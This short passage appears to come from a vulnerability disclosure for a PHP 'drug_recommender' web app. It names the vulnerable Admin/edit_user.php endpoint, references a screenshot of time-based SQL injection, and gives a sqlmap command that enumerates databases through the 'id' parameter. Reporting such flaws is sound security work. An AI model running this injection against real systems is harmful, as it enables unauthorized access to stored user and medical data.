...
GET /drug_recommender/Admin/edit_user.php
...
![POC](images/sqlli%20time%20based%20manual.png)

4.	Further, performing sql injection with sqlmap 

Command: ```python python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_user.php?id=1 –dbs ```
